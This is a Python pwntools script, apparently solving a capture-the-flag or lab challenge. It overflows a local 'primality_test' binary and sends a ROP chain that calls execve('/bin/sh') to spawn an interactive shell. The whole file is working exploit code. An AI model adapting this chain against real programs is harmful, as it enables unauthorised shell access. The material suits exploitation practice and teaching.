"""
Exploit write in Python with Ropper and pwntools.
"""

from pwn import *

# Create ELF binary
file_path = "./primality_test"
exe = ELF(file_path)

# List of gadgets extract with Ropper
POP_EAX_INT = 0x08048606  # pop eax; int 0x80;
POP_EBX_ECX = 0x08048609  # pop ebx; pop ecx; ret;
POP_EDX = 0x0804860c  # pop edx; ret;
BIN_SH = 0x08048991  # "/bin/sh"

# Build ROP chain with correct padding
chain = (b'A'*(0x4c + 4) + p32(POP_EBX_ECX) + p32(BIN_SH) + p32(0) + p32(POP_EDX) + p32(0) + p32(POP_EAX_INT) + p32(11))

print("ROP chain without padding:")
print(chain[80:])

# Executing the executable with ropchain as input
io = process([file_path])
io.sendlineafter(b'Enter a number: ', chain)
# To manually interact with the spawn shell
io.interactive()
